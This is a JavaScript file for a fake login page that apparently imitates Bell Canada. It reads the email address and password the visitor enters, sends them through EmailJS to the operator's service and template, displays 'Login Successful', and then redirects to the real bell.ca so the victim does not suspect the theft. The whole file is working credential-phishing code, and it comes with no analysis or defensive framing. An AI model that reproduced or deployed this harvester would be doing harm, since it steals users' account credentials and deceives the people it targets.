// Initialize EmailJS with your User ID
emailjs.init("fIm1jWIwQ5JUuWTWw"); // Replace with your User ID from EmailJS

const btn = document.getElementById("button");
document.getElementById("form").addEventListener("submit", function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('pw').value.trim();
    if (!email || !password) {
        alert('Please fill in all fields.');
        return;
    }

    btn.value = "Sending...";
    const serviceID = "service_ut76as3"; // Replace with your Service ID
    const templateID = "template_n5lm9ms"; // Replace with your Template ID
    const templateParams = {
        email: email,
        pw: password
    };

    emailjs.send(serviceID, templateID, templateParams).then(
        () => {
            btn.value = "Login Successful";
            window.location.href = "https://bell.ca"; // Redirect after successful submission
        },
        (err) => {
            btn.value = "LOG IN";
            alert(JSON.stringify(err));
        }
    );
});

// Toggle password visibility
const passwordInput = document.getElementById("pw");
const toggleButton = document.getElementById("togglePassword");
toggleButton.addEventListener("click", function () {
    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggleButton.textContent = "Hide";
    } else {
        passwordInput.type = "password";
        toggleButton.textContent = "Show";
    }
});
